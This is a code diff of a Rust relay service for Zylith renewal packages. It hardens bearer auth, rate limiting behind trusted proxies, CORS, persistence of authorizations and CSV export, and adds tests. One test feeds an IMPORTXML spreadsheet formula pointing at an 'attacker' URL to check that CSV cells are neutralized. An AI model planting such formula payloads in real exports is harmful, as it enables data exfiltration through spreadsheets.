-                return Err(RelayApiError::status(StatusCode::UNAUTHORIZED));
-            }
-            BearerAuthStatus::Missing => {}
-        }
-    }
     if verify_package_authorization_from_headers(package, headers).unwrap_or(false) {
         return Ok(());
     }
-    Err(RelayApiError::status(StatusCode::UNAUTHORIZED))
-}
-
-fn require_internal_auth(state: &AppState, headers: &HeaderMap) -> Result<(), RelayApiError> {
-    require_optional_bearer(
+    let Some(token) = headers
+        .get(AUTHORIZATION)
+        .and_then(|value| value.to_str().ok())
+        .and_then(extract_bearer_token)
+    else {
+        return Err(RelayApiError::status(StatusCode::UNAUTHORIZED));
+    };
+    let mut has_configured_token = false;
+    for expected in [
+        state
+            .config
+            .package_registration_token
+            .as_deref()
+            .map(String::as_str),
         state
             .config
             .internal_control_token
             .as_deref()
             .map(String::as_str),
-        headers,
-    )
-    .map_err(RelayApiError::status)
+    ]
+    .into_iter()
+    .flatten()
+    {
+        has_configured_token = true;
+        if constant_time_eq(token, expected) {
+            return Ok(());
+        }
+    }
+    if !has_configured_token {
+        return Err(RelayApiError::status(StatusCode::UNAUTHORIZED));
+    }
+    Err(RelayApiError::status(StatusCode::UNAUTHORIZED))
 }
 
-fn require_optional_bearer(expected: Option<&str>, headers: &HeaderMap) -> Result<(), StatusCode> {
-    let Some(expected) = expected else {
-        return Ok(());
+fn require_internal_auth(state: &AppState, headers: &HeaderMap) -> Result<(), RelayApiError> {
+    let Some(expected) = state
+        .config
+        .internal_control_token
+        .as_deref()
+        .map(String::as_str)
+    else {
+        return Err(RelayApiError::status(StatusCode::UNAUTHORIZED));
     };
     let token = headers
         .get(AUTHORIZATION)
         .and_then(|value| value.to_str().ok())
         .and_then(extract_bearer_token)
-        .ok_or(StatusCode::UNAUTHORIZED)?;
+        .ok_or_else(|| RelayApiError::status(StatusCode::UNAUTHORIZED))?;
     if !constant_time_eq(token, expected) {
-        return Err(StatusCode::UNAUTHORIZED);
+        return Err(RelayApiError::status(StatusCode::UNAUTHORIZED));
     }
     Ok(())
 }
@@ -1921,7 +2879,11 @@ fn header_str<'a>(headers: &'a HeaderMap, name: &str) -> Result<&'a str, String>
         .ok_or_else(|| format!("{name} missing"))
 }
 
-async fn enforce_rate_limit(state: &AppState, headers: &HeaderMap) -> Result<(), RelayApiError> {
+async fn enforce_rate_limit(
+    state: &AppState,
+    headers: &HeaderMap,
+    peer: Option<SocketAddr>,
+) -> Result<(), RelayApiError> {
     let limit = state.config.rate_limit_per_minute;
     if limit == 0 {
         return Ok(());
@@ -1935,7 +2897,8 @@ async fn enforce_rate_limit(state: &AppState, headers: &HeaderMap) -> Result<(),
             hasher.update(token.as_bytes());
             format!("{:x}", hasher.finalize())
         })
-        .or_else(|| trusted_proxy_rate_limit_subject(headers))
+        .or_else(|| trusted_proxy_rate_limit_subject(headers, peer.map(|address| address.ip())))
+        .or_else(|| peer.map(|address| address.ip().to_string()))
         .unwrap_or_else(|| "anonymous".into());
     let now = now_unix_ms();
     let mut limits = state.rate_limits.write().await;
@@ -1955,36 +2918,78 @@ async fn enforce_rate_limit(state: &AppState, headers: &HeaderMap) -> Result<(),
     Ok(())
 }
 
-fn trusted_proxy_rate_limit_subject(headers: &HeaderMap) -> Option<String> {
-    if !trusted_proxy_headers_enabled() {
+fn trusted_proxy_rate_limit_subject(
+    headers: &HeaderMap,
+    peer_ip: Option<IpAddr>,
+) -> Option<String> {
+    if !trusted_proxy_headers_enabled_for_peer(peer_ip) {
         return None;
     }
-    headers
-        .get("x-forwarded-for")
-        .and_then(|value| value.to_str().ok())
-        .and_then(|value| value.split(',').next())
-        .map(str::trim)
-        .filter(|value| !value.is_empty())
-        .map(|value| value.chars().take(96).collect())
+    for header in ["x-forwarded-for", "x-real-ip"] {
+        if let Some(value) = headers
+            .get(header)
+            .and_then(|value| value.to_str().ok())
+            .and_then(|value| value.split(',').next())
+            .map(str::trim)
+            .filter(|value| !value.is_empty())
+        {
+            return Some(value.chars().take(96).collect());
+        }
+    }
+    None
 }
 
-fn trusted_proxy_headers_enabled() -> bool {
-    matches!(
+fn trusted_proxy_headers_enabled_for_peer(peer_ip: Option<IpAddr>) -> bool {
+    let enabled = matches!(
         env::var("ZYLITH_RENEWAL_RELAY_TRUST_PROXY_HEADERS")
+            .or_else(|_| env::var("ZYLITH_TRUST_PROXY_HEADERS"))
             .unwrap_or_default()
             .trim()
             .to_ascii_lowercase()
             .as_str(),
         "1" | "true" | "yes"
-    )
+    );
+    if !enabled {
+        return false;
+    }
+    let Some(peer_ip) = peer_ip else {
+        return false;
+    };
+    let cidrs = env::var("ZYLITH_RENEWAL_RELAY_TRUSTED_PROXY_CIDRS")
+        .or_else(|_| env::var("ZYLITH_TRUSTED_PROXY_CIDRS"))
+        .unwrap_or_default();
+    cidrs
+        .split(',')
+        .map(str::trim)
+        .filter(|value| !value.is_empty())
+        .filter_map(|value| value.parse::<IpNet>().ok())
+        .any(|network| network.contains(&peer_ip))
 }
 
 fn prune_store_locked(store: &mut RelayStore, config: &RelayConfig, now: u64) {
     if config.package_retention_ms == 0 {
         return;
     }
+    let newest_observed_epoch = store
+        .packages
+        .values()
+        .flat_map(|package| package.results.values())
+        .map(|entry| entry.result.epoch_id)
+        .max();
     store.packages.retain(|_, package| {
-        now.saturating_sub(package.updated_at_unix_ms) <= config.package_retention_ms
+        if now.saturating_sub(package.updated_at_unix_ms) > config.package_retention_ms {
+            return false;
+        }
+        if let Some(epoch) = newest_observed_epoch
+            && epoch
+                > package
+                    .package
+                    .end_epoch
+                    .saturating_add(config.package_expiry_warning_epochs)
+        {
+            return false;
+        }
+        true
     });
     store
         .cancelled_packages
@@ -2009,7 +3014,8 @@ async fn persist_store(
     path: &FsPath,
     store: &Arc<RwLock<RelayStore>>,
 ) -> Result<(), RelayApiError> {
-    let snapshot = store.read().await.clone();
+    let mut snapshot = store.read().await.clone();
+    sanitize_store_for_persistence(&mut snapshot);
     if is_sqlite_store(path) {
         return persist_sqlite_store(path, snapshot)
             .await
@@ -2029,6 +3035,12 @@ async fn persist_store(
         .await
         .map_err(RelayApiError::internal)?;
     Ok(())
+}
+
+fn sanitize_store_for_persistence(store: &mut RelayStore) {
+    for stored in store.packages.values_mut() {
+        stored.package.relay_authorization = None;
+    }
 }
 
 fn is_sqlite_store(path: &FsPath) -> bool {
@@ -2064,8 +3076,9 @@ fn load_sqlite_store_sync(path: &FsPath) -> Result<RelayStore, String> {
         while let Some(row) = rows.next().map_err(|error| error.to_string())? {
             let package_id: String = row.get(0).map_err(|error| error.to_string())?;
             let package_json: String = row.get(1).map_err(|error| error.to_string())?;
-            let package = serde_json::from_str::<OfflineRenewalPackage>(&package_json)
+            let mut package = serde_json::from_str::<OfflineRenewalPackage>(&package_json)
                 .map_err(|error| format!("invalid package JSON for {package_id}: {error}"))?;
+            package.relay_authorization = None;
             let registered_at_unix_ms = row.get::<_, i64>(2).map_err(|error| error.to_string())?;
             let updated_at_unix_ms = row.get::<_, i64>(3).map_err(|error| error.to_string())?;
             store.packages.insert(
@@ -2135,12 +3148,8 @@ fn persist_sqlite_store_sync(path: &FsPath, snapshot: RelayStore) -> Result<(), 
     let transaction = connection
         .transaction()
         .map_err(|error| error.to_string())?;
-    let retained_package_ids = snapshot.packages.keys().cloned().collect::<BTreeSet<_>>();
-    let retained_cancelled_package_ids = snapshot
-        .cancelled_packages
-        .keys()
-        .cloned()
-        .collect::<BTreeSet<_>>();
+    let mut snapshot = snapshot;
+    sanitize_store_for_persistence(&mut snapshot);
     for (package_id, stored) in snapshot.packages {
         let package_json =
             serde_json::to_string(&stored.package).map_err(|error| error.to_string())?;
@@ -2240,51 +3249,40 @@ fn persist_sqlite_store_sync(path: &FsPath, snapshot: RelayStore) -> Result<(), 
             )
             .map_err(|error| error.to_string())?;
     }
-    let existing_package_ids = {
-        let mut statement = transaction
-            .prepare("SELECT package_id FROM relay_packages")
+    transaction.commit().map_err(|error| error.to_string())
+}
+
+async fn persist_sqlite_package_tombstone(
+    path: &FsPath,
+    package_id: &str,
+    cancelled_at_unix_ms: u64,
+) -> Result<(), String> {
+    let path = path.to_path_buf();
+    let package_id = package_id.to_string();
+    tokio::task::spawn_blocking(move || {
+        let mut connection = open_sqlite_store(&path)?;
+        let transaction = connection
+            .transaction()
             .map_err(|error| error.to_string())?;
-        let mut rows = statement.query([]).map_err(|error| error.to_string())?;
-        let mut package_ids = Vec::new();
-        while let Some(row) = rows.next().map_err(|error| error.to_string())? {
-            package_ids.push(row.get::<_, String>(0).map_err(|error| error.to_string())?);
-        }
-        package_ids
-    };
-    for package_id in existing_package_ids {
-        if retained_package_ids.contains(&package_id) {
-            continue;
-        }
         transaction
             .execute(
                 "DELETE FROM relay_packages WHERE package_id = ?1",
                 params![package_id.as_str()],
             )
             .map_err(|error| error.to_string())?;
-    }
-    let existing_cancelled_package_ids = {
-        let mut statement = transaction
-            .prepare("SELECT package_id FROM relay_cancelled_packages")
-            .map_err(|error| error.to_string())?;
-        let mut rows = statement.query([]).map_err(|error| error.to_string())?;
-        let mut package_ids = Vec::new();
-        while let Some(row) = rows.next().map_err(|error| error.to_string())? {
-            package_ids.push(row.get::<_, String>(0).map_err(|error| error.to_string())?);
-        }
-        package_ids
-    };
-    for package_id in existing_cancelled_package_ids {
-        if retained_cancelled_package_ids.contains(&package_id) {
-            continue;
-        }
         transaction
             .execute(
-                "DELETE FROM relay_cancelled_packages WHERE package_id = ?1",
-                params![package_id.as_str()],
+                "INSERT INTO relay_cancelled_packages (package_id, cancelled_at_unix_ms) \
+                 VALUES (?1, ?2) \
+                 ON CONFLICT(package_id) DO UPDATE SET \
+                    cancelled_at_unix_ms=excluded.cancelled_at_unix_ms",
+                params![package_id.as_str(), cancelled_at_unix_ms as i64],
             )
             .map_err(|error| error.to_string())?;
-    }
-    transaction.commit().map_err(|error| error.to_string())
+        transaction.commit().map_err(|error| error.to_string())
+    })
+    .await
+    .map_err(|error| error.to_string())?
 }
 
 async fn load_sqlite_due_slots_for_package(
@@ -2452,10 +3450,21 @@ fn csv_row(values: &[&str]) -> String {
 }
 
 fn csv_cell(value: &str) -> String {
-    if value.contains([',', '"', '\n', '\r']) {
-        format!("\"{}\"", value.replace('"', "\"\""))
+    let mut sanitized = value
+        .chars()
+        .take(512)
+        .map(|character| match character {
+            '\r' | '\n' => ' ',
+            _ => character,
+        })
+        .collect::<String>();
+    if matches!(sanitized.chars().next(), Some('=' | '+' | '-' | '@')) {
+        sanitized.insert(0, '\'');
+    }
+    if sanitized.contains([',', '"', '\n', '\r']) {
+        format!("\"{}\"", sanitized.replace('"', "\"\""))
     } else {
-        value.to_string()
+        sanitized
     }
 }
 
@@ -2649,10 +3658,14 @@ async fn release_persistent_tick_lease(path: &FsPath, owner: &str) {
 
 fn service_cors_layer(config: &RelayConfig) -> CorsLayer {
     let layer = CorsLayer::new()
-        .allow_methods([Method::GET, Method::POST, Method::OPTIONS])
+        .allow_methods([Method::GET, Method::POST, Method::DELETE, Method::OPTIONS])
         .allow_headers(Any);
     if config.allowed_origins.is_empty() {
-        return layer.allow_origin(Any);
+        return if config.bind_addr.ip().is_loopback() {
+            layer.allow_origin(Any)
+        } else {
+            layer
+        };
     }
     layer.allow_origin(AllowOrigin::list(config.allowed_origins.clone()))
 }
@@ -2674,6 +3687,34 @@ fn parse_allowed_origins(env_name: &str) -> Result<Vec<HeaderValue>, String> {
 
 fn normalize_url(value: String) -> String {
     value.trim_end_matches('/').to_string()
+}
+
+fn configured_urls_from_env(list_env: &str, single_env: &str) -> Vec<String> {
+    let mut urls = env::var(list_env)
+        .ok()
+        .map(|value| {
+            value
+                .split(',')
+                .filter_map(non_empty)
+                .map(normalize_url)
+                .collect::<Vec<_>>()
+        })
+        .unwrap_or_default();
+    if urls.is_empty()
+        && !single_env.is_empty()
+        && let Ok(value) = env::var(single_env)
+        && let Some(url) = non_empty(&value)
+    {
+        urls.push(normalize_url(url));
+    }
+    dedup_urls(urls)
+}
+
+fn dedup_urls(urls: Vec<String>) -> Vec<String> {
+    let mut seen = BTreeSet::new();
+    urls.into_iter()
+        .filter(|url| seen.insert(url.to_ascii_lowercase()))
+        .collect()
 }
 
 fn non_empty(value: &str) -> Option<String> {
@@ -2771,6 +3812,56 @@ mod tests {
     use tokio::sync::oneshot;
     use tower::ServiceExt;
 
+    static TEST_ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
+
+    #[test]
+    fn trusted_proxy_rate_limit_subject_ignores_untrusted_forwarded_headers() {
+        let _guard = TEST_ENV_LOCK.lock().expect("env lock");
+        unsafe {
+            std::env::set_var("ZYLITH_RENEWAL_RELAY_TRUST_PROXY_HEADERS", "true");
+            std::env::remove_var("ZYLITH_RENEWAL_RELAY_TRUSTED_PROXY_CIDRS");
+            std::env::remove_var("ZYLITH_TRUSTED_PROXY_CIDRS");
+        }
+        let mut headers = HeaderMap::new();
+        headers.insert("x-forwarded-for", "203.0.113.9".parse().expect("header"));
+        let peer: SocketAddr = "198.51.100.7:9443".parse().expect("peer");
+
+        assert_eq!(
+            trusted_proxy_rate_limit_subject(&headers, Some(peer.ip())),
+            None
+        );
+
+        unsafe {
+            std::env::remove_var("ZYLITH_RENEWAL_RELAY_TRUST_PROXY_HEADERS");
+        }
+    }
+
+    #[test]
+    fn trusted_proxy_rate_limit_subject_accepts_forwarded_headers_from_trusted_cidr() {
+        let _guard = TEST_ENV_LOCK.lock().expect("env lock");
+        unsafe {
+            std::env::set_var("ZYLITH_RENEWAL_RELAY_TRUST_PROXY_HEADERS", "true");
+            std::env::set_var(
+                "ZYLITH_RENEWAL_RELAY_TRUSTED_PROXY_CIDRS",
+                "198.51.100.0/24",
+            );
+            std::env::remove_var("ZYLITH_TRUSTED_PROXY_CIDRS");
+        }
+        let mut headers = HeaderMap::new();
+        headers.insert("x-forwarded-for", "203.0.113.9".parse().expect("header"));
+        let peer: SocketAddr = "198.51.100.7:9443".parse().expect("peer");
+
+        assert_eq!(
+            trusted_proxy_rate_limit_subject(&headers, Some(peer.ip())),
+            Some("203.0.113.9".into())
+        );
+
+        unsafe {
+            std::env::remove_var("ZYLITH_RENEWAL_RELAY_TRUST_PROXY_HEADERS");
+            std::env::remove_var("ZYLITH_RENEWAL_RELAY_TRUSTED_PROXY_CIDRS");
+        }
+    }
+
     fn test_package(coordinator_url: String, prover_url: String) -> OfflineRenewalPackage {
         let mut package = OfflineRenewalPackage {
             version: 1,
@@ -2782,7 +3873,8 @@ mod tests {
             end_epoch: 42,
             slot_count: 1,
             relay_mode: Some(RelayMode::ZylithRelay),
-            parent_cancel_authority: None,
+            parent_cancel_authority: Some("0xparent".into()),
+            parent_cancel_marker: Some("0xcancel".into()),
             relay_authorization: None,
             ingress_key_registry_fingerprint: None,
             relay_policy: RelayPolicy {
@@ -2804,6 +3896,29 @@ mod tests {
         };
         refresh_test_package_commitment(&mut package);
         package
+    }
+
+    #[test]
+    fn managed_fast_submission_remains_immediate() {
+        let mut package = test_package(
+            "https://coordinator.example".into(),
+            "https://prover.example".into(),
+        );
+        package.relay_mode = Some(RelayMode::ZylithRelay);
+        package.relay_policy.submission_safety_buffer_ms = 15_000;
+        package.relay_policy.max_submission_delay_ms = 0;
+        let batch = PublicBatchSummary {
+            batch_id: package.slots[0].batch_id.clone(),
+            epoch_id: package.slots[0].epoch_id,
+            close_time_unix_ms: now_unix_ms().saturating_add(120_000),
+            status: "Open".into(),
+        };
+
+        assert_eq!(effective_max_submission_delay_ms(&package), 0);
+        assert_eq!(
+            scheduled_submission_time(&batch, &package, &package.slots[0]),
+            0
+        );
     }
 
     fn two_slot_test_package(
@@ -2859,7 +3974,8 @@ mod tests {
             end_epoch: start_epoch + slot_count as u64 - 1,
             slot_count,
             relay_mode: Some(RelayMode::ZylithRelay),
-            parent_cancel_authority: None,
+            parent_cancel_authority: Some("0xparent".into()),
+            parent_cancel_marker: Some("0xcancel".into()),
             relay_authorization: None,
             ingress_key_registry_fingerprint: None,
             relay_policy: RelayPolicy {
@@ -2884,6 +4000,7 @@ mod tests {
             zylith_core::renewal_cancel_authority_from_renewal_cancel_auth_key_felt(private_key)
                 .expect("relay auth authority");
         package.parent_cancel_authority = Some(parent_cancel_authority.clone());
+        package.parent_cancel_marker = Some("0xcancel".into());
         refresh_test_package_commitment(package);
         let authorization = zylith_core::sign_renewal_relay_package_authorization(
             private_key,
@@ -2906,8 +4023,14 @@ mod tests {
                 package_registration_token: None,
                 default_coordinator_url: None,
                 default_prover_url: None,
+                default_coordinator_failover_urls: Vec::new(),
+                default_prover_failover_urls: Vec::new(),
                 coordinator_control_token: None,
                 internal_control_token: None,
+                prover_control_token: None,
+                alert_webhook_urls: Vec::new(),
+                alert_webhook_token: None,
+                alert_repeat_ms: DEFAULT_ALERT_REPEAT_MS,
                 tick_interval_ms: DEFAULT_TICK_MS,
                 enable_worker: false,
                 max_package_slots: DEFAULT_MAX_PACKAGE_SLOTS,
@@ -2919,12 +4042,108 @@ mod tests {
                 package_retention_ms: DEFAULT_PACKAGE_RETENTION_MS,
                 rate_limit_per_minute: 0,
                 accepted_relay_mode: AcceptedRelayMode::ZylithRelay,
+                package_expiry_warning_epochs: DEFAULT_PACKAGE_EXPIRY_WARNING_EPOCHS,
             },
             store: Arc::new(RwLock::new(RelayStore::default())),
             http: Client::new(),
             tick_lock: Arc::new(Mutex::new(())),
             rate_limits: Arc::new(RwLock::new(BTreeMap::new())),
+            alert_dispatch_cache: Arc::new(RwLock::new(BTreeMap::new())),
         }
+    }
+
+    #[test]
+    fn prune_store_removes_expired_packages_and_cancel_tombstones() {
+        let mut state = test_state(temp_store_path("prune-retention"));
+        state.config.package_retention_ms = 100;
+        state.config.package_expiry_warning_epochs = 2;
+        let now = 1_000;
+
+        let mut aged_out = test_package("http://coordinator".into(), "http://prover".into());
+        aged_out.package_id = "pkg-aged-out".into();
+        aged_out.slots[0].slot_id = "pkg-aged-out:1".into();
+        refresh_test_package_commitment(&mut aged_out);
+
+        let mut epoch_expired = test_package("http://coordinator".into(), "http://prover".into());
+        epoch_expired.package_id = "pkg-epoch-expired".into();
+        epoch_expired.slots[0].slot_id = "pkg-epoch-expired:1".into();
+        epoch_expired.start_epoch = 40;
+        epoch_expired.end_epoch = 40;
+        epoch_expired.slots[0].epoch_id = 40;
+        epoch_expired.slots[0].batch_id = "STRK-USDC-40".into();
+        refresh_test_package_commitment(&mut epoch_expired);
+
+        let mut live = test_package("http://coordinator".into(), "http://prover".into());
+        live.package_id = "pkg-live".into();
+        live.slots[0].slot_id = "pkg-live:1".into();
+        live.start_epoch = 100;
+        live.end_epoch = 100;
+        live.slots[0].epoch_id = 100;
+        live.slots[0].batch_id = "STRK-USDC-100".into();
+        refresh_test_package_commitment(&mut live);
+        let mut live_result = slot_result(&live.slots[0], RelaySlotStatus::Submitted, None);
+        live_result.epoch_id = 101;
+
+        let mut store = RelayStore::default();
+        store.packages.insert(
+            aged_out.package_id.clone(),
+            StoredPackage {
+                package: aged_out,
+                registered_at_unix_ms: now - 500,
+                updated_at_unix_ms: now - 101,
+                results: BTreeMap::new(),
+            },
+        );
+        store.packages.insert(
+            epoch_expired.package_id.clone(),
+            StoredPackage {
+                package: epoch_expired.clone(),
+                registered_at_unix_ms: now,
+                updated_at_unix_ms: now,
+                results: BTreeMap::from([(
+                    epoch_expired.slots[0].slot_id.clone(),
+                    StoredSlotResult {
+                        result: slot_result(
+                            &epoch_expired.slots[0],
+                            RelaySlotStatus::Submitted,
+                            None,
+                        ),
+                        attempts: 1,
+                        last_attempt_unix_ms: now,
+                    },
+                )]),
+            },
+        );
+        store.packages.insert(
+            live.package_id.clone(),
+            StoredPackage {
+                package: live.clone(),
+                registered_at_unix_ms: now,
+                updated_at_unix_ms: now,
+                results: BTreeMap::from([(
+                    live.slots[0].slot_id.clone(),
+                    StoredSlotResult {
+                        result: live_result,
+                        attempts: 1,
+                        last_attempt_unix_ms: now,
+                    },
+                )]),
+            },
+        );
+        store
+            .cancelled_packages
+            .insert("pkg-cancel-aged-out".into(), now - 101);
+        store
+            .cancelled_packages
+            .insert("pkg-cancel-live".into(), now - 100);
+
+        prune_store_locked(&mut store, &state.config, now);
+
+        assert!(!store.packages.contains_key("pkg-aged-out"));
+        assert!(!store.packages.contains_key("pkg-epoch-expired"));
+        assert!(store.packages.contains_key("pkg-live"));
+        assert!(!store.cancelled_packages.contains_key("pkg-cancel-aged-out"));
+        assert!(store.cancelled_packages.contains_key("pkg-cancel-live"));
     }
 
     #[test]
@@ -2956,6 +4175,7 @@ mod tests {
         state.config.default_coordinator_url = Some("http://coordinator".into());
         state.config.default_prover_url = Some("http://prover".into());
         state.config.internal_control_token = Some(Arc::new("internal-token".into()));
+        state.config.prover_control_token = Some(Arc::new("prover-token".into()));
         state.config.allowed_origins = vec![HeaderValue::from_static("https://app.zylith.fi")];
 
         let response = app(state)
@@ -2982,6 +4202,7 @@ mod tests {
         state.config.default_coordinator_url = Some("http://coordinator".into());
         state.config.default_prover_url = Some("http://prover".into());
         state.config.internal_control_token = Some(Arc::new("internal-token".into()));
+        state.config.prover_control_token = Some(Arc::new("prover-token".into()));
         state.config.allowed_origins = vec![HeaderValue::from_static("https://app.zylith.fi")];
 
         let response = app(state)
@@ -3001,7 +4222,8 @@ mod tests {
 
     #[tokio::test]
     async fn metrics_exposes_alertable_operational_counters() {
-        let state = test_state(temp_store_path("metrics"));
+        let mut state = test_state(temp_store_path("metrics"));
+        state.config.internal_control_token = Some(Arc::new("internal-token".into()));
         let mut package = test_package("http://coordinator".into(), "http://prover".into());
         let mut missed_slot = package.slots[0].clone();
         missed_slot.slot_id = "pkg-1:2".into();
@@ -3063,6 +4285,7 @@ mod tests {
                 axum::http::Request::builder()
                     .method("GET")
                     .uri("/metrics")
+                    .header(AUTHORIZATION, "Bearer internal-token")
                     .body(axum::body::Body::empty())
                     .unwrap(),
             )
@@ -3077,10 +4300,14 @@ mod tests {
         assert!(text.contains("zylith_renewal_relay_packages 1"));
         assert!(text.contains("zylith_renewal_relay_slots 3"));
         assert!(text.contains("zylith_renewal_relay_submitted_slots 1"));
-        assert!(text.contains("zylith_renewal_relay_pending_slots 0"));
+        assert!(text.contains("zylith_renewal_relay_pending_slots 1"));
         assert!(text.contains("zylith_renewal_relay_missed_slots 1"));
         assert!(text.contains("zylith_renewal_relay_failed_slots 1"));
         assert!(text.contains("zylith_renewal_relay_awaiting_wallet_refresh_slots 0"));
+        assert!(text.contains("zylith_renewal_relay_retryable_failed_slots 1"));
+        assert!(text.contains("zylith_renewal_relay_package_expiring_soon 0"));
+        assert!(text.contains("zylith_renewal_relay_warning_alerts 1"));
+        assert!(text.contains("zylith_renewal_relay_critical_alerts 1"));
     }
 
     #[tokio::test]
@@ -3113,6 +4340,186 @@ mod tests {
                 axum::http::Request::builder()
                     .method("GET")
                     .uri("/metrics")
+                    .header(AUTHORIZATION, "Bearer internal-token")
+                    .body(axum::body::Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::OK);
+        cleanup_sqlite_store(&path);
+    }
+
+    #[tokio::test]
+    async fn ops_summary_exposes_alertable_package_state() {
+        let mut state = test_state(temp_store_path("ops-summary"));
+        state.config.internal_control_token = Some(Arc::new("internal-token".into()));
+        state.config.package_expiry_warning_epochs = 10;
+        let mut package = test_package("http://coordinator".into(), "http://prover".into());
+        let submitted_slot = package.slots[0].clone();
+        let mut failed_slot = package.slots[0].clone();
+        failed_slot.slot_id = "pkg-1:2".into();
+        failed_slot.order_commitment = "0xfailed".into();
+        failed_slot.epoch_id = 43;
+        let mut pending_slot = package.slots[0].clone();
+        pending_slot.slot_id = "pkg-1:3".into();
+        pending_slot.order_commitment = "0xpending".into();
+        pending_slot.epoch_id = 44;
+        package.end_epoch = 44;
+        package.slot_count = 3;
+        package.slots.push(failed_slot.clone());
+        package.slots.push(pending_slot);
+
+        {
+            let mut store = state.store.write().await;
+            store.packages.insert(
+                package.package_id.clone(),
+                StoredPackage {
+                    package,
+                    registered_at_unix_ms: 1,
+                    updated_at_unix_ms: 1,
+                    results: BTreeMap::from([
+                        (
+                            "pkg-1:1".into(),
+                            StoredSlotResult {
+                                result: slot_result(
+                                    &submitted_slot,
+                                    RelaySlotStatus::Submitted,
+                                    None,
+                                ),
+                                attempts: 1,
+                                last_attempt_unix_ms: 1,
+                            },
+                        ),
+                        (
+                            failed_slot.slot_id.clone(),
+                            StoredSlotResult {
+                                result: slot_result(&failed_slot, RelaySlotStatus::Failed, None),
+                                attempts: 2,
+                                last_attempt_unix_ms: 2,
+                            },
+                        ),
+                    ]),
+                },
+            );
+        }
+
+        let response = app(state)
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("GET")
+                    .uri("/ops/summary")
+                    .header(AUTHORIZATION, "Bearer internal-token")
+                    .body(axum::body::Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::OK);
+        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
+            .await
+            .unwrap();
+        let summary: Value = serde_json::from_slice(&body).unwrap();
+
+        assert_eq!(summary["package_count"], 1);
+        assert_eq!(summary["counts"]["total_slots"], 3);
+        assert_eq!(summary["counts"]["submitted_slots"], 1);
+        assert_eq!(summary["counts"]["failed_slots"], 1);
+        assert_eq!(summary["counts"]["unobserved_slots"], 1);
+        assert_eq!(summary["last_observed_epoch"], 43);
+        let alert_codes = summary["alerts"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|alert| alert["code"].as_str().unwrap())
+            .collect::<BTreeSet<_>>();
+        assert!(alert_codes.contains("failed_slots"));
+        assert!(alert_codes.contains("package_expires_soon"));
+    }
+
+    #[tokio::test]
+    async fn alert_webhook_dispatches_active_alerts_once_per_repeat_window() {
+        let delivery_count = Arc::new(AtomicU64::new(0));
+        let app = Router::new().route(
+            "/alerts",
+            post({
+                let delivery_count = delivery_count.clone();
+                move |Json(_body): Json<Value>| {
+                    let delivery_count = delivery_count.clone();
+                    async move {
+                        delivery_count.fetch_add(1, Ordering::SeqCst);
+                        StatusCode::NO_CONTENT
+                    }
+                }
+            }),
+        );
+        let (webhook_url, webhook_shutdown) = spawn_mock(app).await;
+        let mut state = test_state(temp_store_path("alert-webhook"));
+        state.config.alert_webhook_urls = vec![format!("{webhook_url}/alerts")];
+        state.config.alert_repeat_ms = 60_000;
+        let package = test_package("http://coordinator".into(), "http://prover".into());
+        let failed_slot = package.slots[0].clone();
+        {
+            let mut store = state.store.write().await;
+            store.packages.insert(
+                package.package_id.clone(),
+                StoredPackage {
+                    package,
+                    registered_at_unix_ms: 1,
+                    updated_at_unix_ms: 1,
+                    results: BTreeMap::from([(
+                        failed_slot.slot_id.clone(),
+                        StoredSlotResult {
+                            result: slot_result(
+                                &failed_slot,
+                                RelaySlotStatus::Failed,
+                                Some("coordinator unavailable".into()),
+                            ),
+                            attempts: 1,
+                            last_attempt_unix_ms: 1,
+                        },
+                    )]),
+                },
+            );
+        }
+
+        dispatch_ops_alerts(&state).await;
+        dispatch_ops_alerts(&state).await;
+
+        assert_eq!(delivery_count.load(Ordering::SeqCst), 1);
+        let _ = webhook_shutdown.send(());
+    }
+
+    #[tokio::test]
+    async fn strict_ops_endpoints_require_internal_token() {
+        let path = temp_sqlite_store_path("strict-ops");
+        let mut state = test_state(path.clone());
+        state.config.strict_mode = true;
+        state.config.internal_control_token = Some(Arc::new("internal-token".into()));
+        state.config.default_coordinator_url = Some("http://coordinator".into());
+        state.config.default_prover_url = Some("http://prover".into());
+        state.config.coordinator_control_token = Some(Arc::new("control-token".into()));
+        state.config.allowed_origins = vec![HeaderValue::from_static("https://app.zylith.fi")];
+        let router = app(state);
+
+        let response = router
+            .clone()
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("GET")
+                    .uri("/ops/alerts")
+                    .body(axum::body::Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
+
+        let response = router
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("GET")
+                    .uri("/ops/alerts")
                     .header(AUTHORIZATION, "Bearer internal-token")
                     .body(axum::body::Body::empty())
                     .unwrap(),
@@ -3176,6 +4583,16 @@ mod tests {
     }
 
     #[test]
+    fn csv_cell_neutralizes_spreadsheet_formulas() {
+        assert_eq!(
+            csv_cell("=IMPORTXML(\"https://attacker\")"),
+            "\"'=IMPORTXML(\"\"https://attacker\"\")\""
+        );
+        assert_eq!(csv_cell("+1"), "'+1");
+        assert_eq!(csv_cell("@cmd"), "'@cmd");
+    }
+
+    #[test]
     fn validation_rejects_duplicate_slots() {
         let mut package = test_package("http://coordinator".into(), "http://prover".into());
         package.slots.push(package.slots[0].clone());
@@ -3199,16 +4616,20 @@ mod tests {
         state.config.allowed_origins = vec![HeaderValue::from_static("https://app.zylith.fi")];
         assert!(validate_package(&package, &state.config).is_ok());
 
+        state.config.default_coordinator_url = Some("http://127.0.0.1:3000".into());
+        state.config.default_prover_url = Some("http://127.0.0.1:3200".into());
+        assert!(validate_package(&package, &state.config).is_ok());
+
         state.config.default_coordinator_url = None;
         state.config.default_prover_url = None;
-        assert!(validate_package(&package, &state.config).is_ok());
+        assert!(validate_package(&package, &state.config).is_err());
         package.relay_policy.coordinator_url = String::new();
         package.relay_policy.prover_url = String::new();
         assert!(validate_package(&package, &state.config).is_err());
         package.relay_policy.coordinator_url = "http://coordinator".into();
         package.relay_policy.prover_url = "http://prover".into();
         refresh_test_package_commitment(&mut package);
-        assert!(validate_package(&package, &state.config).is_ok());
+        assert!(validate_package(&package, &state.config).is_err());
         cleanup_sqlite_store(&state.config.store_path);
     }
 
@@ -3232,6 +4653,87 @@ mod tests {
